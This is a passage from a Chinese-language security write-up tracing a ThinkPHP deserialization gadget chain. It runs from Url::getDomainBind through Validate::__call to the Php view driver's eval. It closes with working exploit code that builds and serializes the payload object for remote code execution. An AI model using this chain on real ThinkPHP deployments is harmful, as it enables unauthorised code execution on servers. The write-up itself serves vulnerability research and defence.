                    $anchor = $info['fragment'];
                    if (false !== strpos($anchor, '?')) {
                        // 解析参数
                        [$anchor, $info['query']] = explode('?', $anchor, 2);
                    }
                    if (false !== strpos($anchor, '@')) {
                        // 解析域名
                        [$anchor, $domain] = explode('@', $anchor, 2);
                    }
                } elseif (strpos($url, '@') && false === strpos($url, '\\')) {
                    // 解析域名
                    [$url, $domain] = explode('@', $url, 2);
                }
            }
            if ($url) { 
                 /**
                * ......
                */
                $rule = $this->route->getName($checkName, $checkDomain);
                /**
                * ......
                */
            }
            if (!empty($rule) && $match = $this->getRuleUrl($rule, $vars, $domain)) {
                // 匹配路由命名标识
                $url = $match[0];
                if ($domain && !empty($match[1])) {
                    $domain = $match[1];
                }
                if (!is_null($match[2])) {
                    $suffix = $match[2];
                }
            } elseif (!empty($rule) && isset($name)) {
                throw new \InvalidArgumentException('route name not exists:' . $name);
            } else {
                // 检测URL绑定
                $bind = $this->route->getDomainBind($domain && is_string($domain) ? $domain : null);
                 /**
                * ......
                */
            }
             /**
            * ......
            */
        }
    }
我们先让让 `$this->url` 构造成 `a:` ，此时 `$url` 的值也就为 `''`，后边的各种条件也不会成立，可以直接跳过 。
然后再看 `if($url)` ，由于 **弱类型** 比较直接略过。
此时由于 `$rule` 是在 `if($url){` 条件内被赋值，那么 `if (!empty($rule) && $match =
$this->getRuleUrl($rule, $vars, $domain))` 以及 `elseif (!empty($rule) &&
isset($name))` 这两个也不会成立，直接略过。
此时，我们来到 `else{` 内，其中 `$bind = $this->route->getDomainBind($domain &&
is_string($domain) ? $domain : null)` 这个代码为点睛之笔。显然，`$this->route`
是可控的，`$domain` 变量的值实际上就是 `$this->domain` ，也是一个可控的字符型变量，我们现在就能得到了一个 **[可控类] - >
getDomainBind([可控字符串])** 的调用形式。
总结来说，满足该调用形式需要构造：
  * `$this->url` = `'a:'`
  * `$this->app` = `给个public的request属性的任意类`
然后全局搜索 `__call` 魔法方法，在 `Validate` 类
`(vendor/topthink/framework/src/think/Validate.php)` 中存在一个可以称为 **“简直为此量身定做”**
的形式。
    // class Str{}
    public static function studly(string $value): string
    {
        $key = $value;
        if (isset(static::$studlyCache[$key])) {
            return static::$studlyCache[$key];
        }
        $value = ucwords(str_replace(['-', '_'], ' ', $value));
        return static::$studlyCache[$key] = str_replace(' ', '', $value);
    }
    public static function camel(string $value): string
    {
        if (isset(static::$camelCache[$value])) {
            return static::$camelCache[$value];
        }
        return static::$camelCache[$value] = lcfirst(static::studly($value));
    }
    // class Validate{}
    class Validate
    {
        public function is($value, string $rule, array $data = []): bool
        {
            switch (Str::camel($rule)) {
                case 'require':
                    // 必须
                    $result = !empty($value) || '0' == $value;
                    break;
                /**
                * ......
                */
                    break;
                case 'token':
                    $result = $this->token($value, '__token__', $data);
                    break;
                default:
                    if (isset($this->type[$rule])) {
                        // 注册的验证规则
                        $result = call_user_func_array($this->type[$rule], [$value]);
                    } elseif (function_exists('ctype_' . $rule)) {
                        /**
                        * ......
                        */
            }
            return $result;
        }
        public function __call($method, $args)
        {
            if ('is' == strtolower(substr($method, 0, 2))) {
                $method = substr($method, 2);
            }
            array_push($args, lcfirst($method));
            return call_user_func_array([$this, 'is'], $args);
        }
    }
这里先从 `__call` 看起，显然在调用 `call_user_func_array` 函数时，相当于
`$this->is([$domain,'getDomainBind'])` ，其中 `$domain` 是可控的。
跟进 `$this->is` 方法， `$rule` 变量的值即为 `getDomainBind`， `Str::camel($rule)`
的意思实际上是将 `$rule = 'getDomainBind'` 的 **-** 和 **_** 替换成 **''** ， 并将每个单词首字母大写存入
`static::$studlyCache['getDomainBind']` 中，然后回头先将首字母小写后赋值给 `camel` 方法的
`static::$cameCache['getDomainBind']` ，即返回值为 **getDomainBind** 。
由于 `switch{` 没有一个符合 **getDomainBind** 的 `case` 值，我们可以直接看 `default` 的内容。
`$this->type[$rule]` 相当于 `$this->type['getDomainBind']` ，是可控的，而 `$value`
值即是上边的 `$domain` 也是可控的，我们现在就能得到了一个 **call_user_func_array([可控变量],[[可控变量]])**
的形式了。
实际上现在也就可以进行传入 **单参数** 的函数调用，可这并不够！！！我们来到 `Php` 类
`(vendor/topthink/framework/src/think/view/driver/Php.php)` 中，这里存在一个调用 `eval`
的且可传 **单参数** 的方法 `display` 。
    class Php implements TemplateHandlerInterface
    {
        public function display(string $content, array $data = []): void
        {
            $this->content = $content;
            extract($data, EXTR_OVERWRITE);
            eval('?>' . $this->content);
        }
    }
假若用上边的 **call_user_func_array([可控变量],[[可控变量]])** 形式，构造出
`call_user_func_array(['Php类','display'],[''])` 即可执行 `eval` 了。
总的来说，我们只需要构造如下：
  * `$this->type` = `["getDomainBind" => [Php类,'display']]`
就可以了。
## 0x04 简单示图
  * 构造并触发 `__toString` ：
  * 构造 `[可控类] -> getDomainBind([可控字符串])` 进入 `__call`：
  * 构造 `call_user_func_array([可控变量],[[可控变量]])` 执行 `eval`：
## 0x05 EXP
    lazySave = true;
                $this->withEvent = false;
                $this->table = new route\Url(new Middleware,new Validate,$cmd);
            }
        }
        class Middleware{
            public $request = 2333;
        }
        class Validate{
            protected $type;
            function __construct(){
                 $this->type = [
                    "getDomainBind" => [new view\driver\Php,'display']
                ];
            }
        }
    }
    namespace think\model{
        use think\Model;
        class Pivot extends Model{} 
    }
    namespace think\route{
        class Url
        {
            protected $url = 'a:';
            protected $domain;
            protected $app;
            protected $route;
            function __construct($app,$route,$cmd){
                $this->domain = $cmd;
                $this->app = $app;
                $this->route = $route;
            }
        }
    }
    namespace{
        echo base64_encode(serialize(new think\Model\Pivot('')));
    }
利用结果：
* * *